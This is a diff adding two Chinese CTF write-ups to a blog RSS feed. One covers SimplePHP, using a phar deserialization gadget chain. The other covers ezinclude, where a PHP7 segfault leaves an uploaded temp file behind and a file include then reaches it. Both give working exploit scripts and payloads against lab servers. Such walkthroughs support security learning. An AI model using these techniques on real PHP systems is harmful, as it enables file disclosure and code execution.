@@ -9,7 +9,9 @@
         <lastBuildDate>Mon, 04 Nov 2024 22:08:36 +0800</lastBuildDate>
         <category>buuctf</category>
         <category>regexp注入</category>
+        <category>phar反序列化</category>
         <category>thinkphpV6.0.0</category>
+        <category>php7 segment fault特性</category>
         <category>zip加密</category>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2024/11/04/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</guid>
@@ -87,6 +89,310 @@ echo urlencode(serialize($c));
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;出来的时候是 O 开头）&lt;/p&gt;
 &lt;p&gt;仔细的反序列化过程：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3OT91X2F0b2tlbj1lMTk4M2NjYTcxMTViYjczZGM4MjYxMzk1ZjM4ZTQyOCZhbXA7dV9hc2lnPTFhMGMzOTlhMTcyNzA3ODI1MzU5OTM0NzdlMDAzNQ==&#34;&gt;https://xz.aliyun.com/t/6479?u_atoken=e1983cca7115bb73dc8261395f38e428&amp;amp;u_asig=1a0c399a17270782535993477e0035&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/06/08/[SWPUCTF%202018]SimplePHP/</guid>
+            <title>[SWPUCTF 2018]SimplePHP</title>
+            <link>http://odiws.github.io/2024/06/08/[SWPUCTF%202018]SimplePHP/</link>
+            <category>buuctf</category>
+            <category>phar反序列化</category>
+            <pubDate>Sat, 08 Jun 2024 21:00:07 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;swpuctf-2018simplephp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpuctf-2018simplephp&#34;&gt;#&lt;/a&gt; [SWPUCTF 2018]SimplePHP&lt;/h2&gt;
+&lt;p&gt;有读取文件，能读到如下文件：&lt;/p&gt;
+&lt;p&gt;file.php?file=index.php/base.php/upload_file.php/function.php/file.php/class.php&lt;/p&gt;
+&lt;p&gt;file.php 文件内容如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
+header(&amp;quot;content-type:text/html;charset=utf-8&amp;quot;);  
+include &#39;function.php&#39;; 
+include &#39;class.php&#39;; 
+ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
+$file = $_GET[&amp;quot;file&amp;quot;] ? $_GET[&#39;file&#39;] : &amp;quot;&amp;quot;; 
+if(empty($file)) &amp;#123; 
+    echo &amp;quot;&amp;lt;h2&amp;gt;There is no file to show!&amp;lt;h2/&amp;gt;&amp;quot;; 
+&amp;#125; 
+$show = new Show(); 
+if(file_exists($file)) &amp;#123; 
+    $show-&amp;gt;source = $file; 
+    $show-&amp;gt;_show(); 
+&amp;#125; else if (!empty($file))&amp;#123; 
+    die(&#39;file doesn\&#39;t exists.&#39;); 
+&amp;#125; 
+?&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;注意使用的是 file_exists () 函数。&lt;/p&gt;
+&lt;p&gt;class.php 文件内容如下:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class C1e4r
+&amp;#123;
+    public $test;
+    public $str;
+    public function __construct($name)
+    &amp;#123;
+        $this-&amp;gt;str = $name;
+    &amp;#125;
+    public function __destruct()
+    &amp;#123;
+        $this-&amp;gt;test = $this-&amp;gt;str;
+        echo $this-&amp;gt;test;
+    &amp;#125;
+&amp;#125;
+
+class Show
+&amp;#123;
+    public $source;
+    public $str;
+    public function __construct($file)
+    &amp;#123;
+        $this-&amp;gt;source = $file;   //$this-&amp;gt;source = phar://phar.jpg
+        echo $this-&amp;gt;source;
+    &amp;#125;
+    public function __toString()
+    &amp;#123;
+        $content = $this-&amp;gt;str[&#39;str&#39;]-&amp;gt;source;
+        return $content;
+    &amp;#125;
+    public function __set($key,$value)
+    &amp;#123;
+        $this-&amp;gt;$key = $value;
+    &amp;#125;
+    public function _show()
+    &amp;#123;
+        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&amp;gt;source)) &amp;#123;
+            die(&#39;hacker!&#39;);
+        &amp;#125; else &amp;#123;
+            highlight_file($this-&amp;gt;source);
+        &amp;#125;
+        
+    &amp;#125;
+    public function __wakeup()
+    &amp;#123;
+        if(preg_match(&amp;quot;/http|https|file:|gopher|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;
+            echo &amp;quot;hacker~&amp;quot;;
+            $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
+        &amp;#125;
+    &amp;#125;
+&amp;#125;
+class Test
+&amp;#123;
+    public $file;
+    public $params;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;params = array();
+    &amp;#125;
+    public function __get($key)
+    &amp;#123;
+        return $this-&amp;gt;get($key);
+    &amp;#125;
+    public function get($key)
+    &amp;#123;
+        if(isset($this-&amp;gt;params[$key])) &amp;#123;
+            $value = $this-&amp;gt;params[$key];
+        &amp;#125; else &amp;#123;
+            $value = &amp;quot;index.php&amp;quot;;
+        &amp;#125;
+        return $this-&amp;gt;file_get($value);
+    &amp;#125;
+    public function file_get($value)
+    &amp;#123;
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    &amp;#125;
+&amp;#125;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看到 Class 想到反序列化，但是没看到啥 unserialize () 函数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public function _show()
+&amp;#123;
+    if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&amp;gt;source)) &amp;#123;
+        die(&#39;hacker!&#39;);
+    &amp;#125; else &amp;#123;
+        highlight_file($this-&amp;gt;source);
+    &amp;#125;
+    
+&amp;#125;
+public function __wakeup()
+&amp;#123;
+    if(preg_match(&amp;quot;/http|https|file:|gopher|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;
+        echo &amp;quot;hacker~&amp;quot;;
+        $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里有个 WAF，不能直接查看 f1ag.php，所以需要用其他方法读取。很容易想到利用 file_get_contents 或 highlight_file 函数读取文件内容。&lt;/p&gt;
+&lt;p&gt;涉及知识点：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;除了 unserialize () 来利用反序列化漏洞之外，还可以利用 phar 文件以序列化的形式存储用户自定义的 meta-data 这一特性，扩大 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;受影响的函数如下：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这道题满足这几个条件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;存在受影响的函数 file_get_contents、file_exists。&lt;/li&gt;
+&lt;li&gt;phar 文件能够上传到服务器端。&lt;/li&gt;
+&lt;li&gt;没有过滤【:】、【/】、【pchar】等关键词。&lt;/li&gt;
+&lt;li&gt;有可用的魔术方法作为 “跳板”。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;file_get_contents () 函数是 file_get 方法中的，file_get 方法在 get 方法中被调用，get 方法在__get 魔术方法中被触发：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;__get：当希望访问某个对象的未定义的或者不可访问的属性不报错，我们可以在类里定义__get 方法，这样系统在此刻会自动调用该方法&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;因此要考虑触发__get 魔术方法，访问一个 Test 类中不存在的属性。&lt;/p&gt;
+&lt;p&gt;Show 类有这么一段代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public $source;
+public function __toString()
+&amp;#123;
+    $content = $this-&amp;gt;str[&#39;str&#39;]-&amp;gt;source;
+    return $content;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;__toString：用于一个类被当成字符串时应怎样回应。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这里的 source 属性是在 Show 类里的，Test 类里并不存在，因此 str [‘str’] = new Test () 可以触发__get 魔术方法。&lt;/p&gt;
+&lt;p&gt;接下来考虑触发__toString () 类，找到能输出东西的地方，在 C1e4r 类里有如下代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public function __destruct()
+&amp;#123;
+    $this-&amp;gt;test = $this-&amp;gt;str;
+    echo $this-&amp;gt;test;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;它会在某个对象的所有引用都被删除或者当对象被显式销毁时执行。&lt;/p&gt;
+&lt;p&gt;最后总结思路如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;通过 C1e4r 类，将 str 赋值为 show 类。（$this-&amp;gt;test = $this-&amp;gt;Show）&lt;/li&gt;
+&lt;li&gt;C1e4r 类最后会 echo $this-&amp;gt;test; 触发 Show 类的__toString () 魔术方法&lt;/li&gt;
+&lt;li&gt;__toString () 魔术方法执行 $content = this-&gt;str[‘str’]-&gt;source;将str[‘str’]赋值为Test类，Test类中不存在source属性，触发Test类的__get(key) 魔术方法。&lt;/li&gt;
+&lt;li&gt;因为 $value = &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt;params[&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;key]; 所以 params=array (‘source’=&amp;gt;’/var/www/html/fl1g.php’);&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;exp 如下：&lt;/p&gt;
+&lt;p&gt;需要将 php.ini 中的 phar.readonly 选项设置为 Off，PHPstudy 版本切换 5.5.38。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class C1e4r
+&amp;#123;
+    public $test;
+    public $str;
+&amp;#125;
+class Test
+&amp;#123;
+    public $file;
+    public $params;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;params = array();
+    &amp;#125;
+    public function __get($key)
+    &amp;#123;
+        return $this-&amp;gt;get($key);
+    &amp;#125;
+    public function get($key)
+    &amp;#123;
+        if(isset($this-&amp;gt;params[$key])) &amp;#123;
+            $value = $this-&amp;gt;params[$key];
+        &amp;#125; else &amp;#123;
+            $value = &amp;quot;index.php&amp;quot;;
+        &amp;#125;
+        return $this-&amp;gt;file_get($value);
+    &amp;#125;
+    public function file_get($value)
+    &amp;#123;
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    &amp;#125;
+&amp;#125;
+class Show
+&amp;#123;
+    public $source;
+    public $str;
+&amp;#125;
+$phar = new Phar(&amp;quot;1.phar&amp;quot;); //后缀名必须为phar
+$phar-&amp;gt;startBuffering();
+$phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;); 
+// 可以理解为一个标志，格式为xxx&amp;lt;?php xxx; __HALT_COMPILER();?，前面内容不限，但必须以__HALT_COMPILER();?来结尾，否则phar扩展将无法识别这个文件为phar文件
+$t = new Test();
+$t-&amp;gt;params = array(&amp;quot;source&amp;quot;=&amp;gt;&amp;quot;/var/www/html/f1ag.php&amp;quot;);
+$s = new Show();
+$s-&amp;gt;str = array(&amp;quot;str&amp;quot;=&amp;gt;$t);
+$c = new C1e4r();
+$c-&amp;gt;str = $s;
+$phar-&amp;gt;setMetadata($c); //将自定义的meta-data存入manifest
+$phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quot;); //添加要压缩的文件
+//签名自动计算
+$phar-&amp;gt;stopBuffering();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;抓包上传改后缀：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/wIq9Vx.png&#34; alt=&#34;wIq9Vx&#34;&gt;&lt;/p&gt;
+&lt;p&gt;找到文件路径，通过查看 function.php 可得知文件存在 upload 文件夹内，恰好这个文件夹可以访问 qwq。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;file.php?file=phar://upload/090b0844ab952f0df2b28e1f9bc24dad.jpg&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/woSN5R.png&#34; alt=&#34;woSN5R&#34;&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;base64 解码得到 flag&lt;/p&gt;
+&lt;p&gt;出自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTE0MS5odG1s&#34;&gt;https://www.shawroot.cc/1141.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/06/07/[NPUCTF2020]ezinclude/</guid>
+            <title>&#39;[NPUCTF2020]ezinclude&#39;</title>
+            <link>http://odiws.github.io/2024/06/07/[NPUCTF2020]ezinclude/</link>
+            <category>buuctf</category>
+            <category>php7 segment fault特性</category>
+            <pubDate>Fri, 07 Jun 2024 22:00:34 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;npuctf2020ezinclude&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#npuctf2020ezinclude&#34;&gt;#&lt;/a&gt; [NPUCTF2020]ezinclude&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进去发现是用户名与密码错误&lt;/p&gt;
+&lt;p&gt;F12 发现提示：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;要 md5name 后的字符串等于 pass，不知道 pass，可以 bp 发现传送回来的东西有 hash 这个东西&lt;/p&gt;
+&lt;p&gt;直接加入 pass 等于这个 hash 值得到：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得到 flflflflag.php 这个文件。&lt;/p&gt;
+&lt;p&gt;但是他会直接进到 404.html 文件&lt;/p&gt;
+&lt;p&gt;然后就不会了；接着就是大佬的操作了：&lt;/p&gt;
+&lt;p&gt;大佬看到了 php 的版本 7.0.33，直接就是：&lt;/p&gt;
+&lt;h4 id=&#34;php7-segment-fault特性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php7-segment-fault特性&#34;&gt;#&lt;/a&gt; php7 segment fault 特性&lt;/h4&gt;
+&lt;p&gt;扫目录可得 dir.php&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;…… 扫不出来&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;向 PHP 发送含有文件区块的数据包时，让 PHP 异常崩溃退出，POST 的临时文件就会被保留&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;php &amp;lt; 7.2&lt;br&gt;
+php://filter/string.strip_tags/resource=/etc/passwd&lt;/li&gt;
+&lt;li&gt;php7 老版本通杀&lt;br&gt;
+ php://filter/convert.quoted-printable-encode/resource=data://,% bfAAAAAAAAAAAAAAAAAAAAAAA% ff% ff% ff% ff% ff% ff% ff% ffAAAAAAAAAAAAAAAAAAAAAAAA&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;嫖个脚本：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+from io import BytesIO
+
+mode1 = &amp;quot;php://filter/string.strip_tags/resource=/etc/passwd&amp;quot;
+mode2 = &amp;quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;
+url = &amp;quot;http://93fed8e6-341b-499c-b41b-0f0a6288549b.node4.buuoj.cn:81/flflflflag.php?file=&amp;quot;
+
+url = url + mode1
+payload = &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;
+
+files = &amp;#123;
+    &amp;quot;file&amp;quot;: BytesIO(payload.encode())
+&amp;#125;
+
+res = requests.post(url=url, files=files, allow_redirects=False)
+
+print(res.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;访问 dir.php：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;有个文件名，访问本地 file=/tmp/phpBWqZND&lt;/p&gt;
+&lt;p&gt;该脚本写了一个 php 探针：直接 bp 访问该文件&lt;/p&gt;
+&lt;p&gt;因为直接访问好像不能打开，会直接跳转到 404.html 文件里面，无法访问 php 探针。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取 flag，完成撒花～～～～～～～～&lt;/p&gt;
  ]]></description>
         </item>
         <item>
